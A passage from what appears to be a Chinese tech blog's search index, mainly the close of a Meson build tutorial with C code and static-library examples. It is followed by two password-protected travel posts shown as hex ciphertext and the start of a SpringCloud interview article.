'boolean', value: false, description: 'use HPET timer in EAL') Meson 还支持在生成项目编译配置时，通过 -D 指定编译参数 1234567891011# 进入Meson项目的根目录$ cd meson_project# 指定编译参数，生成输出目录$ meson build -Dprefix=/usr -Dtests=disabled# 进入输出目录$ cd build# 编译代码$ ninja -j8 Meson 打印编译信息通过 --verbose 参数，Messon 和 Ninja 可以打印详细的编译信息，包括编译项目时，执行的所有命令 12345678910# 进入输出目录$ cd build# 编译代码$ meson compile --verbose# 或者# 编译代码$ ninja --verbose Meson 实战应用案例构建可执行项目warning若使用的是 Windows 平台，则需要在 Visual Studio 开发人员工具（Native Tools Command Prompt for VS xxxx）里执行 Meson 的命令，这是因为 C/C++ 编译器只会在该工具上运行。 第一步：创建项目，目录结构如下，点击下载完整的案例代码 123meson_demo├── main.c└── meson.build main.c 的文件内容 123456#include &lt;stdio.h&gt;int main(int argc, char *argv[]) { printf(\"Hello World!\\n\"); return 0;} meson.build 的文件内容 12project('meson_demo', 'c')exe = executable('main', 'main.c') 第二步：构建项目 1234567891011121314# 进入项目目录$ meson_demo# 生成构建目录，build是构建目录的名称，可以自定义$ meson build # 或者 meson setup build# 进入构建目录$ cd build# 编译项目代码$ ninja# 运行可执行文件$ ./main Meson 配置文件（meson.build）的说明如下： project('meson_demo', 'c')：指定项目名称和编程语言的类型 exe = executable('main', 'main.c')：指定可执行文件的文件名和入口源文件 构建静态库项目warning若使用的是 Windows 平台，则需要在 Visual Studio 开发人员工具（Native Tools Command Prompt for VS xxxx）里执行 Meson 的命令，这是因为 C/C++ 编译器只会在该工具上运行。 第一步：创建静态库的项目，目录结构如下，点击下载完整的案例代码 12345static_lib_project├── meson.build└── src ├── static_lib.c └── static_lib.h static_lib.h 的文件内容 123456#ifndef _THIRD_LIB_#define _THIRD_LIB_ void info_print(); #endif static_lib.c 的文件内容 1234567#include &lt;stdio.h&gt;#include \"static_lib.h\"void info_print(){ printf(\"hello static library\\n\");} meson.build 的文件内容 12project('static_lib_project', 'c')static_library('static_lib', 'src/static_lib.c') 第二步：构建项目 12345678910111213141516171819202122232425# 进入项目目录$ cd static_lib_project# 生成构建目录，build是构建目录的名称，可以自定义$ meson build # 或者 meson setup build# 进入构建目录$ cd build# 编译项目代码$ ninja# 项目成功编译后，会生成静态库文件\"libstatic_lib.a“ $ ls -aldrwxr-xr-x. 6 clay clay 4096 08月 12 21:05 .drwxr-xr-x. 4 clay clay 46 08月 12 10:13 ..-rw-r--r--. 1 clay clay 2972 08月 12 10:13 build.ninja-rw-r--r--. 1 clay clay 430 08月 12 10:13 compile_commands.json-rw-r--r--. 1 clay clay 3564 08月 12 21:05 libstatic_lib.adrwxr-xr-x. 2 clay clay 31 08月 12 21:05 libstatic_lib.a.pdrwxr-xr-x. 2 clay clay 4096 08月 12 10:13 meson-infodrwxr-xr-x. 2 clay clay 26 08月 12 10:13 meson-logsdrwxr-xr-x. 2 clay clay 4096 08月 12 10:13 meson-private-rw-r--r--. 1 clay clay 808 08月 12 21:05 .ninja_deps-rw-r--r--. 1 clay clay 152 08月 12 21:05 .ninja_log Meson 配置文件（meson.build）的说明如下： project('static_lib_project', 'c')：指定项目名称和编程语言的类型 static_library('static_lib', 'src/static_lib.c')：指定静态库文件的文件名和入口源文件 构建加载第三方静态库的可执行项目warning若使用的是 Windows 平台，则需要在 Visual Studio 开发人员工具（Native Tools Command Prompt for VS xxxx）里执行 Meson 的命令，这是因为 C/C++ 编译器只会在该工具上运行。 第一步：创建静态库的项目，目录结构如下，点击下载完整的案例代码 12345678load_static_lib_project├── meson.build└── src ├── include │&nbsp;&nbsp; └── static_lib.h ├── lib │&nbsp;&nbsp; └── libstatic_lib.a └── main.c static_lib.h 的文件内容 123456#ifndef _THIRD_LIB_#define _THIRD_LIB_ void info_print(); #endif main.c 的文件内容 1234567#include &lt;stdio.h&gt;#include \"static_lib.h\" int main(int argc, char *argv[]) { info_print(); return 0;} meson.build 的文件内容 123project('load_static_lib_project', 'c')libs=meson.get_compiler('c').find_library('static_lib', dirs : join_paths(meson.source_root(),'src/lib'))executable('load_static_lib', 'src/main.c', dependencies : libs, include_directories : 'src/include') 第二步：构建项目 1234567891011121314# 进入项目目录$ cd load_static_lib_project# 生成构建目录，build是构建目录的名称，可以自定义$ meson build # 或者 meson setup build# 进入构建目录$ cd build# 编译项目代码$ ninja# 运行可执行文件$ ./load_static_lib Meson 配置文件（meson.build）的说明如下： 第一行：指定项目名称和编程语言的类型 第二行：指定静态库文件的名称和所在目录的路径，文件名称不需要加”lib” 前缀 第三行：指定可执行文件的文件名、入口源文件、静态库的头文件所在目录的路径 参考博客 Meson 的使用 Meson 构建系统 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"c++ linux系统编程 c语言"},{title:"天河区珠江新城游玩攻略",url:"/posts/8f9b760f.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af81500861d70820a7508d0e06bdee9ab10e1087d359951f6c670591fb18cb97c647a4991346818d0768448394aaf192ecbb765e608125d10be3bef82752a051bee695747e33be490d040bab2b2207a8ddafe3c237d2e191ba113aadfbeced1a23e41ffb0900862aba9d23e7e70ed3d760ee97232c06ba590def8d115d8c7f8d5043680f76107c0f03a0cf63bf14d175d75c143289faf258d2ac2b0c381d5538539c2793540465d127bf4c5c6486e6a8609efa94707c7dc2f4a308809a628af088158c54df0eb98c1d22e514b5e8f17ec32d66900511ec95e82cba79da9ce9d2ff47706ffc743104777c4965ff8a7b19bcd7fb5854f8c8385c178e22fc4b4917634f8174113ab3c248b5567670498e4b3582d370fa25b353dd4483e262b452985c89fed55e0d8b5148d3977984a50f45365af23e0715385c5961089177d1a31f696e1de0307518a492e2d8e785c7c786b32630813cad2535cb3732124351985375ddb611447f77058afe5ec950a2baf6994aaeae40b035c4d1cf26a0064aa989c5cb620194df67aaa661292a8be210a86c515477351fb182e58a285cbbb958595c1a7a832d15fe62b9fe72a553500f7619111dd795a6f5af319463c8839b03ac1190e1bdd487a1c653b16492652442486f9b851d346f68703755028d781c24109df6425d6f7daea0465ce2bc58e0c41fea420a2425644192ea4a9e26d0a07830e393c2b05e3e0fbf67419e2a18868760f0b19d9bddf69e619b83fa3b50b8b0339cf021e36924e00030507b20895d4c475580f4920d1568951a640f5be006b42366953af86c4226e11adb956d5f555d82667aea58554e3f40e0196c51c6ece62332bcf93f5bd269cadcd7914dcb1179ff6a539307f687d8b70d930d9ebbb01e66f6e587dd8119926f0f7eb5da11f12a817d703e931da6744ced4655d806268ece11b6ec943ff8601572e8ab030d2a6c545b36c665a11c97f1a6135638e21c6626f0048a6292c7e92ca945bf2287c0e4294e0cd952d6c003a8159cafbcd7df3599c51628108637a26679b5c9db92455f15fdc6a6fc2f54370cf48935fcca4fbec030d7f5f1b94fa24b01052bdbe4976e9672fccc4d0ce31c0bd55569564735ad93f85ba50f86f4c419a1b67877295d3aaa44d307fa94bd7be2aee7109a08a26528cce8cbdcaa431fef646d9d35a359ce29d32e05dca10c8ca8e4e93fe278ea2c3637c021c1125b8b5a368748291d72981aff77b7db8815b7bcb819430a72c24734c0284f00a6b03238d9da139d34ca30634df032dbc9d21f924e04f82d3f1dcbe8158ce4244e02bfba84eee8e971e9293171ce86a7c20d80b818effdabb7c039d4a13a757294ae2a2ffec61d14c5f18862ad85f26c606a51f74ed494bd55c4b7d256db30e9892838188d78b88577ed4ab981de8f836516bfc00aac99f086246881bf818f7cf7c9add920f754da5d40af6b49ac2cc2ed101ffc9b847934f90b42e15cc0b399520399fd409cfff857d32214232eef8dbff93202768878bf596000be8ad2715d5d1195d8615c49986847bf3c19a0671ff19fc150a1d7deaeb7665c3b97804278f20dbbe0f39977339591934bf9a434c6bf85c298b5b2f2c94cbe2914bc03f2bfc20d04f997fd8251395a5228b56a149c1f7dfddf4c87c530d9077a6a1471e584fa23746bf58fec7f72c8b954a8e410ee0a347fce07d325c765456e942333739342e8ac964c4fff21b1680a4cf1a9de5ef52a8259cb8371d64e9ec4489e78c8c6453005aaffb8252dc760e5a177aaab9b065227e8b33701e79319b0654acde68406608d878c66ae0db6ad515871185b0658f7329b31eba2724206183a3a8672b5bfcc89cfe9fd7e4b93a51a330109d6c7813ba07903c57ca219b008188809a43a4ec5b5f5e12ac5dc16f8a86f6081bc22ebe65c56a1d135397e80181a0a6e215da638661ffb09e7039a3d5c8040e5d59bf21fe76ce4f6e52bc068925a21ff58b8b33f08b689ed326be693feca8be86b610144e140363d2168adc44b0b8bbd323eab01f6c8d06f104706a964641a0c2787f16935fbf2ad46c2662c6be036385c631609974919d11ce9e0eab4e00fcfba7a1827426612397ab33ca98bf3a0dbe301d3bac5716836eacdc53280de5468ac632ed96f68a013155da75a2da97ee79aff970da431780d1fcc148fca22ec32bdf51533426be07d57e74db37825eea457aa4f5f7d7d3a7645f816c8974d189ebc728eb22735c727d42847cba1ec240ecf26807eaa94dceb0bc40aa46c3a6deab799e082538794c791a19b54689cb42c97c4fb4e914ecaac520483de6b11ee53552f944de35973dc41dd25b4baea8a6a379d478c49f9ee0b7d0c8aacd392a5f15564477223dad5329cae43bcbd662d0859b52ffdfa0a67e5bb8e3a0a5eaa3fb52477938b0bdb07d906bbdc18b012109b20f30466ec0e21e10bf831777f6ff14b52f2acb56d224c6f1db3bf86df826a98bc8e2339de5dd4a7a9ba04f6fb51d47e8027e90c61dbafe61576388acece2f9aad826b6382acc6b829240e46cb79c52f5f05656eed1792650e12fd10d6fa8f27f555d13478578dd2569eb64c47dc1c657dfaf89db9de0ff4ccec8b4394aefbeddc1ca8dcb56ff90dd99b77d1bbf9548f53128d11af0fbfe25dc5abef29dc774708e1fc4bbb85c9b818791a2e3a0d3d68cef4426add40c8552ca573a7cd1dd2709d37e3b025b6ce7c84d7c60f3632fb28994462797a5e719b40300c0190012d7ec687d8ad305f0cc6a1b0d122bf04a079db12a70d146c6443c1559c2244133cfa2996bc13e0e74b124c105b6d2373fdc181644b7a456852d23eec36f4f5f42aa8ba06e232ba9613bcf5c9dc12bc3c0ae6493a7d2032d7a9fe6f58757be1f76918532389faf358b92ee2158e182ab7419cdc7375bce78ef8a8f61541eb179475f511d2024da0dd35c68b187bac359eb8eccca58a998598b977498e2ecb561bfa934e79d051b483b06fa34ef6e5829ac894928c1f87435a05ffc16558fdb8dbf461268aa0bad3fb40586f804853c99baddbf898e5a51aac74bbf1c9afc88c35065e1ff57c7d9a0375e656cff792e37d35b6b176472c3897da7656e7c71a51eff2ba52d2eaf0eccc27b22e98c1e067e40a9f8e0cb937a9041a05143656023f362bd1a954ecaf437e6d9da3b64ab9b5c7d3f501fc00556509de4614eb237d66ec88ecd9584bb9b6e63ed2a349e683e8470d87c1c5daddf79645d46bb43cadadafd6d176b54858395032d5d91080f1eca22642d7a7cc7ef1bbe60d29e10b03d7c5439dbbc50d91e1b96edf12149dad92344d474d970d19e855a218962fb6b7e8ea086e2ac9f94609f5d05b1c004c10fe2da278f73164b591aedaac07b9065190e37d9ad7787d912135c5346e7aadf7008683afd2838ce4140683edd22b005be3483b792d51eae1f803b2fd566c41b5f1ddb62454b99765d3f04fa46e95dc70f790e652a47c18c98a8b66585f22fb4def4f9265ee22fa773c47863d8fc2cb2f131141729c12b3be9faece79c93c85c26e6942220c260a6d833f4dda35a183961f768b326cc5602d5890c99abbed0a626cb935e3b5d37b08add53568bf7ea38e91217a0a5d35ef7e6b5945eb5270f81eb25f848892ad6c850ed91637bd94eb29c09881b7d4cd4f5e370ebd68502d11f55bc0024ab56681022a58b5c6d7dacfcf399cda84d73deb36da250428dbea8d17362de3749f4b703ad2080330847d64f5654500fb52a59a225548365330018d3d2abdfd2b68f8824d7964724b5d491f4980974953b09a0c247ef415aba43a5b9e4f9e9531f2457911719c66cea90284dafdf2ce93b7a0ea51d84dcd83098a3574c298bdc52a3c8cb00a1b5a58e5ec76716553f2d803c0cefaa2fe71bd0a06ee84618b68cc74dfe0ca3c5753f6bb7cb5adee2435dd81796bbfb729528bdb57497a728292ba9f1b6c088a4bf4953074ae80e6caf81d675e9d5f81da2a58c0f0e13a4ea135881e120946c88c04f2111e08e0aa5011390e4aec87430dee1b4bbbae9a988390b01042e14cba9e5d352aaa626b2f5e45f1e3442a7308d2c238938f21490fa50042321894dbad64f917855b9f896da862e1e4c2bd8477f8635069d1a60f63df428875c278475e7561f41c1ea95cef544545ef4262ce4964b7a5b167e8bf7d95797072a2e031a6e43a59678a75ab0398efc6b1418760d24489e93bb303b6382140e80138ac0450dcc6466e60f94853f340fabddd327a0ee8bb1f5aced69e903211bb25a695bae9ae933d948ad354edc83208e9e2dac04f387841fdc61f06da27ed833bd559cbdaee6cdca296faf2e1a3ee0a27022cbb070ed7b81f4d684d4599f2a02030c642008ac4d50e1e63e490ce509c47090dbdb037ec553f59670c0211b13179695e986f6f8b150d3e635e66ef7f8098210fb87660bb8692c958eee57a089a1b5040abb7508c365be76cb4fdc6cb6eca9ae71d83ad83446f5afe7e3f451c177b5fd8eef4fb81608d68e223fbc8844e979355e2b71047afc5b99d8b71021698257437f70d05c26559085d370a571ff0801ce89bdf520e6a4e56be08a0b30a88b581ff396adc9b9abbb096886f22800215e4d97644ee8b4331b3121457216537f18b2b91d1a5222929cc0e67a16e1ac1c9a923c0055864fd6888e7fd76435a37295f664d60295fea59ac3932e3d6fbd63ff1ad09d51070a5bd42ee8780ff816079648e844d4d67b5ec988478cb54fcb9a9a68da2f398e37ad2032adefe75cc520787c904206fff76c7a7c858f3d983aefc268916d64c8b9f3fee1f64a950ae06aae21fa57589f61d6364e1fc1a393e630f51d1a80a66ec0af9b0affa9e0ed140d0e5433b325dc12a39822c567036109040c4498e3f4b7b2c5c3fd95ae80a5b28de0be6daf04abf3f098c12f5e414d8da2a5a1d58af7dce32e2d841b4381080eb00eefe8a74069a2a344604114a1c8589366bb7c5b79622e34c9d77eb7137cfbcbb17b9a22f2b634674c548956828acf2983f2623589fad1d9a88522bc734c6337d977e7318afdc1a71ea7692d1c8dd6c1ad4bc032580377cca3a51de105135bec0b07f395583121f79bf7f2d2d68a4a50e4511a8c070ed1edd77694708dca75b101e993112b8e492f57a7a27fc1951b50021087e9f8dc796ee925803e9603939a5c29c6efea292ecccdb4c5f18a50a21566a3f682eafa2d838f388785a24d821d266972589723da8e06a5c9423f35654ca6308d66d5b95a9e88887aeb1a4dca8998b1a9bc1d76c203104948382340866a1289acc2470703490529bb8dcf22ffb00396fd55569f60c9253fd3d8702028fef772a94641e6e331986686a55a1ba9ceefaa6218cf0f0e23600c490e8ad34c8fa1d947288ab3b9d09465c247939c8762a14f28d57218191ba6bdc361cdd79a48f370c43a658abefbe00ac42768f4099af8daf7241f8fab3090a4c9c7e79fc9480875c56d0c9106b3bdeeaaa695a3ce044807b86743f43aea63af1ea84a9a6399d8be6f2ea4fb58cc7baed81fb7116b6c92fe3fc7c8cdef1885375bac26ebe78de07becc721e35273a74d41c4126e6921a6d7bacbdcc165261bb9abc9db8237a8e3201502e39cb54a9f9e45fe988c55f4ee689ff0cc109f01e4424534dea347a370c7f04d90d8b78ee61a062229d3e8bceb6d333aacf4fa3809369199aec61a0fb6e04f5471362dc7473507ab503ac9695e9b80f6e93034b3be1391db5fedfc457b219c37c6a3f6e0115b2edf2d8c74f260afb1a6cda82048628d2a59b4974e7f015a64174da8f6be83cfec0c8232a95de94049f7e469ea6c04bf6d13847f3219c1a28967b77cd30449b4341966ddee50fa03aa006057b872d23b6ccb7f7ada516502bcd781dcf24abe17c6116841116a4b1810cd5b87c6ef4eac0189fb1fccacd9fbed96d2d7aa03070fc1add15908452545c739dbc6c6586a06938922ed9f4e97b854714d01be5afdbf1e21af06a9c434da55998a5763a6a5f234d7697afd6dc5a5fa93b2c474b2f64d5dbd40a8a925fd2e3e0bf42a02b1cedfe222de207e3ea1ee09cd7390bc5947021131e341eac426237b5a18a8a75d8b5f631068bcf20a75ff691dfe5bef4ef9d5233a86792601280f276d83543fc802f2af9e4dff51a5e248c7329278c3c0bf4a1fd333582ccf5734ba096514ebddd15b7a5161bf7c056497249b82a82ef1dfbc75716944130b4e6d15783ea223c3b82063e7f716a2764f7fa117ccf53d467640874f09365b61b557dfa6842b7963e18a78e64141108cfa514057c75cdab520d1443f33d350cc3a3e4b6283ddfd09ae8af0db2c3028392fa5600189d0f83b85a374c8bd098c90860789c425fe5c9279700b28675a452d225e8b00b542ced9f4e34b500d99aab96b47aadd6902dec7536f62ea08fe11170a9baa67bbe4d91cc21369e7a0d428dafc25177da62efc053e56245f20f7de44f1c0564172fe47d941cbf7b861062554d9cfd7ccdc9273c2f5f8a4d42c7cbcff1d660297ab5a446c9e57d18ba95bc8e6e6830671d6f50c530a5fdddc9b1e41a26bb97cd5ade122dc736ce1f78522443a774d645b724a77c1fdedec1d43b99c5b9f0dd40b834d62261c565ccb75c9a3724921414872c44ac1c60e8b98d639d75580e1ce3f30452ecef5f010c6de4ab589a90121049cb23a89a00c532f4f5ebc37e5d725c75411e244b59c3a2c9bd0990cfcaa0239b1f4a926d0837b80bb88df0a0570b8811cc6f90ab715d001eaab3d9bf2414708e36144b6640d122c5769788847781a6b7ca55d3b880bcda0a2b97b47c370666bda576e8616c4285cb9f8f0b8f9b2deacae7512137b45fa22df33d2417ab2adfa43089c23136ddb1fbce9fdb3fc8f6e7365aff8704be6326e7ad5ca1faf42f911b5495fd837085ab3b2cfe1278e2eade5ef044109ed1b068216f172f4cf5b77243346450341cfc4218bccbb4d6aade743af3893af09c569d58fd534543e43efb7d2866ac7005f0e068639468d1d91f09bd3da050989f0aa948d38b09a2fb617850388eedf2aac9c2baf4118d2d8a4652919e087283fe5725fbd0f43b271c7781917b3e42fbf57b1ea21c3882d335bfb3865932d82fd87f4c9379e778adee61d4cd26a4cb16ae7822e3cda3bea8e133067393bc2dd04f96f2db15814e7263cd04b01ac197a47a58fcba99f10b90660eb7fc0aff5a6bc80d42d87db2387ac35db4258b108352512b758c12c9f6e037b916a719d61e98073e0164c791250592dd46ea97664010a6ee2f20396019c22bac3bdce0260975bd92ead6ffe9 请 输 入 阅 读 密 码.",tags:"加密博客 游玩攻略"},{title:"天河区体育西路游玩攻略",url:"/posts/4d9c17ad.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af81500861d70820a7508d0e06bdee9ab10e1087d359951f6c670591fb18cb97c647a4991346818d0768448394aaf192ecbb765e608125d10be3bef82752a051bee695747e33be490d040bab2b2207a8ddafe3c237d2e191ba113aadfbeced1a23e41ffb0900862aba9d23e7e70ed3d760ee97232c06ba590def8d115d8c7f8d5043680f76107c0f03a0cf63bf14d175d75c143289faf258d2ac2b0c381d5538539c2793540465d127bf4c5c6486e6a8609efa94707c7dc2f4a308809a628af088158c54df0eb98c1d22e514b5e8f17ec32d66900511ec95e82cba79da9ce9d2ff47706ffc743104777c4965ff8a7b19bcd7fb5854f8c8385c178e22fc4b4917634f8174113ab3c248b5567670498e4b35dcdcc21dbb61f57159cb1bc4dd26416cd644875b2d8530658c6011678117f55afd5b5dcb235a792ee60580e585d3080dee58ca9f7c899c3832d5f76e7c97e6539433af8cf9b369ca498a667902a274f60ac736f761ad127df263db89c57f33fda79aa924bd20ea9083a5a8cc32eb98624a0c9f27d19a58dbb06d07af3828f81756e794c3c60fed78d3eb40fa1abd64e063096d4acfbe37333c0c978997b4f005d8a51f3d29856ec3484b97b96735479de280acf99b5fbf34cbc56318efc636d9608a40b007dc726f51dccd7fa643646726dd0c967f6e5f17238b3c71dc7e7b318fe24ff57649a5fbc4442d87d2d7f5038737ec876b7559105e2ae06420647dd26c97ca55ebc2c74132b3a3476f035e34f27e9fe739fc6eadc6d254588beb90d9a03bea22335b4913ef04d109f67b12798aa3758db21edd02cdc6e48fa276a0d6a5f681fd397e2d0cb0c5004f604f0e311873c8781bdc16aa831a429521abde4fdf251a4bd08a0d945d59118165272a074413bdc39e0c3136463e35f0b6b80572565a32aa83927516ff06c4962ad31eebe87299ea33420e20efd6d36a2a7d31b9d872594025801dcbf9acd8431582e0741f7c74501752dda8ad110794575bb4910c7717a8d5635062db26dcb91cfd9ffc3cb81ad4206cf044045513b59a7278f5f3afa389674fcc80c1a224a90b0cef1c3174799588719470ea1e7974dbe03aad70967a9cd3d6e841bfed03be69a079bf9c3d51ea878ecd829634e90a563bdc4761544443829470ad9f8b717705f21e92a87c3453cd41a202e149e2b54bc6f00d2f3e42d0034bf75f9e18ec5663c93c9e0362a412c08b560d36452f3e6e5df8a6a6862ffbe82dbd67f11740dba954491d80acfe05e13819e50fc3dfdd5633cc6535cea45b1d2134d62a3891281614bed0caae2d923afef07da8e6d2152009feb7fa6e8aa46f233e0662af08154f816f6b14e4229bfa9bb645c97f6c8a2adebcd4d0036749e2a4f6d5c456b40f521cd334fe5c80409777364580ba41b46a69a76feca143dfc6a5c28920b9cfc90bf52c6431ea9fed0c4db648cdb898851d7833579c420a29764994b69ed59ba48ea276e7c4f6774214ee1ab0da840fa2a71cde9d7f84790a5c2357f46a854a7aee27bf10e8d0da3c734a6470fdb213325ebc7c30762d6aed4ec9cc68c276e68d403983b5e4400b56dba617f53ad275744509e67026d19183824da0bebb5b013e1f6973742d212a9b4a63d2ac181dbea894ff27dfe365d458a31265580f6b8488408596413020dc0b086b23eeeed9268d1efcdb117c182844bfcdee8b083bac025e84408ef4b213afe31acd83f3d10d98d8502ac5221032ebec7289eaf3ada191970d34ef4402725a681da02da61eb4ff03a4e9066c0e1397dba683cd7b86c00637c424b225d51e13533cea074f32943fdea71cfd09c100f499b0e45f9080f839fe0f70000baf93f8d61a28a1f774ed1f78ea4fdb85db256aab95d4bcd1b96be1d400da731ad92c976eb62de7295f2982ac39965467f85bd8fe765b701a9c918eb4006a6757e802a06b4101ebaff880fee5121d3340b456f7463a8ae9bbf22b4b83bcd1075dfadde2a8e9a9a350969bdfbc333f3e86224fa79d35f843ee4df95afaa8cebf7d868cfdaf122f157e1eee8471ef503491496b63281bff56c168ee792110d29eca23092deb7f1701483b23f708a0a8fde8bdba6af62cf46900c908015b476019f253f447534f03789620eb79d175798f1db7de8ed5d3549eac9f6dc0adb314669f669300f0cb218f9a5a72dcd1ba85757c676ca8a9c30b3c62deaece0cad9d4285609acf17aa7bc78738ef21b9d166e1596456ccf1284754a4d404a034b24394ef58f22de2ff76a7f76b0836e778c88ae17f7da7ce5acb061b767298a1c4286c670ee324924571da3ca8fe88d745576449bb9aa6a227fab4a24502f5e708639cf68274acd0a3569b25051a3cfc2ccaa95f87e751a99b97c6f94266837aedf7ff0804335f52c794acddd8894d149c766b26cf64e65fe0ece56264a7babbd624913cc434e2c146cb251566a01383968d3188b621ebc35c1dde2613473ad8145d48438f68087eb31c2949670da90d3cb4d14153305022f4a924bbdb14b173b383e452783f7280e67a4c23316585bbf9fad9b393e5e14ce02bed19eeaadcfdb18e385e0ef565084d13b77ffbf1a011f3d70868e5919499d6cacae04ddc4a420d018e473a0fafe0f7a3757dd403e4d8f5fbd9c93140a20ec59fa4c4d240679334628399de2287bef6e47f668c1f264f2d27a8e1837fd98530b39e55547e5470e51551a2312e2956c52a7afc412438b4356a880bfd000b9942769133acbe1ccbfec4a95ad4f6f7c1b7ade4c2ab203e4b9528b34cd566d9b9d791dddd4abf232a0cb00150b395d85a66a8a8167d12a8f1f4ad4817bdbfd0df06587012445c9bac99d63f560286b00cda48e12ddcf213ddbea3c5e6d3588fee9166e059fda1de6fbef36801a2362efae7e9ba0a444410201dc65c9b8d2eebc32e30300e146204490941fb0ae89befcbaed4baa7d36cf3ad2a02dd6a9247351ca0cdbd97dfeee82e85f574a4e3ac018b4f8cb2085062a7a6d56854027992bb7bd4c009dda952c410c4fca2ca98f479cdcfd2ed115894c7f86f21c218a07c32b92ceafd7bb19b01ca1382dc5ca1433d668c02532bb2375d631e88b231ed3b5a82a44b0e79d58d1ab839fd07852b969d427b8091030fcb391c15bb7549f1f207d87c2a8354e0d01464de0bfea4fbbb89d813f5c3400f555fe581e123c1c74e318bcef0582659477d12b06579fb028b825f2dd5d911298205072da5967e03f4f9bb6f6067e7c77ea6f4a7765914d2471cf622cec9e61016e25f660e91e13b52828a051b7d5e736c685bdf34978c9d8d159c19241ea925da6d32c61aa359550c29ed24b01b3928da151fda41e8635419fbb64d9a834f626c4b6bba7583d34f2c9f18ee822d0d40569a98c26103ca94b41539a6955522bb7b83d4ea0fc459e753fa5101c3710f40f41246a2501fd0ad24e92297d7e96228daa510e2cf921f57c39dd80b4b2290f296c7cb711279f331506c3fa33eddc8130d02d81da7e7f215de3535dc0b8cb7adedb16537a51797257de7d0d6f03a098033e05aa1d0e8770b6f615f48f675958b908fedfaa4b9b608479cd0ae8977376aa8ced69a830fb1ae624d43cded65a8f947ab3a31dfe57229fbc6f905903e4a38d8f36e4533fe44edc22648a78f1bf196ead5ea64e301e74edf928225e9ea3b469df600d99b93d89b72de57f966aa87b427a98e8522668acef8690e21036c9802db142bbab136b878ede58b0f6365b73cc144867cc83f666cba510a9ca8033069fc510dbeed007b7e74c6bcd965b42124497db0924802409bfd4e83d228d269590c87d785c1f3198c2aeeb963737871f96e89f9985abf4d375310e55e2500a4733a59e79a8ca6dadd49cbb70fe8e9bce47cf329055c2100a594d0b01827591ef324b6448fa67a122fe4c599dfb156d3b4bad5fc57981b864e407bb26fc1d31273eb76cad8adb378bbd6c14bfdfddf46a0eb1d3e9ba991740d9da6d10b815f82977157860d01c1a9400f9798d71f8b7cc0ebe1a5839d8122ced0a20445fe51dc00bc1bbbae608b6b24d6f303515d807f996dd6557da80ef1c82d9161bf7945b81bfde5c36d50ce0a1a4480843bd70f0d931b60877cbc71d3b965a89e321369691c0c8c3ea0300a65d03a8d367ffe0c2b872ad3cd2521b809ab72717aa1182dc24764de0861c393a7993da858af593a5a84b82c0bf6452dd54f50ca143ee9da1f591a0ef0fe84945fb3479e5c9608172f68be8f8293567b4226b6df3d9a23c365c22b6cfc366f89743279be08cc15f363d0443a6f1cca388e3a97e42315e84ec1d5ae40b4e6a5bd0ad5555aa6772ea428a15f5ce5d65c101621d0e243617490ffdd7594c4a466f402da6f197490feee0c956b36e762cdbe3bf209cb423c17bf79abfd26a6215f69c7bb6c9b9ad11197167dd5bcbf4c62e6b0c6eca65b69bf4aaad26a9551a3e89fdd470d9e3d1979853d27b4d4c837dd0580fd06500e25ebd7384ca4fd17ad6d66535945afb6d884bc2fcfe0e3009c4617df1e04107350cfe4e15a4345c263d9f8372e93356402797ae2c613dfee7106ea32908a8284a18a67527b2f0f16216b3555a504d1a2a3f25fd32427481259b4bc1d5a74c4544c6ac74c58ba37da02c3adef6d9ec527e3c301e627f15f4efc92f993aadd2a786944a631a8c111bd8fc2cab44c7ed32dbe30ed3564d225129b944284f7e446d8880a281e29beed80d201717070e79157c6c04fca1210374873db32fd455cbeea41a0aad7701a2d24cf2ad6d7496660151b103d311ce6d35fabe441a6789c52b72a32a11b76ad5ea94305578115ffda56951446041a4f4a629fd9a2fe000e431328b0b5e4b6d663bb4bb66e7b739c856040489cdad5e7016fa81bfdea7a41080180f33ee023cd23d30a0ccb61a05c20229f0ae9fa6a71711a81e00aa8872f2a7d32ee05ab21bb57a0229048e9e75df6d86f8d9aef6976711e0c17e5a8cbe8ce1108e6420c539ea13f04db2ef834c935b4656613c166642330b4e6a3ccbfa9bb4b3fd6f3585b2ce9b758cf8d51c6776ebdc73af5bae7040e84a9a1343a9705926b5db7ef65dfe417e40ada106bf96c891588c8c3c1f9bc00c72810cbf5eaaed1427d9b4038915cba22a35176e88e499606254a6998ae2f255ecbad40a623f30c729a6c76106fc4eab28870faa43b7621f946e316e81fdced2d849293933ffd80fbd2f59081acf909d389a42dba00258bd152558cddfb9473225b45e6801f20e7f8e6df498728dd369bee448fba57a3f998b3f365e32284e3e3c45085e139c4844d4b36ac195c2ff2d8990d2a0eb8e2362610f289bdb372dba448b4839ab71c1bde89a040c845a3cd04facc3d45ea0efe9583a6e71359a63ddc4bcd3d7212a1629180e49d1b1eab66bba321774311c0eb2c40ae49596e3876e3725047ce2b253bc4d02b756e86ae251852b90273044ce65dadc91e7c19adf3ad71aaaf69cd61634f51a383e224df291935f22d609831fafa77ac9e021d61efde29ed01d3f318854b6050dc334a682d15b4fd804afe38011bfce19d8f7aac7b7842202ea2cce1906cfb3607f746982eb8ab47799b9eec7b7928bfd2db057ffa81b2df6ea80eb0d439429c727fc2a08e86b36c44f2fbc0fe663e7ec7a8729038655bfcc3 请 输 入 阅 读 密 码.",tags:"加密博客 游玩攻略"},{title:"SpringCloud 面试题之一",url:"/posts/1cdff3b4.html",text:'微服务微服务的概述微服务理论的提出者马丁。福勒（Martin Fowler） 在其博客中详细描述了什么是微服务。微服务强调的是服务的大小，它关注的是某一个点，是具体解决某一个问题 / 提供落地对应服务的一个服务应用；狭意的看，可以看作 Eclipse 里面的一个个微服务工程 / 或者 Module。 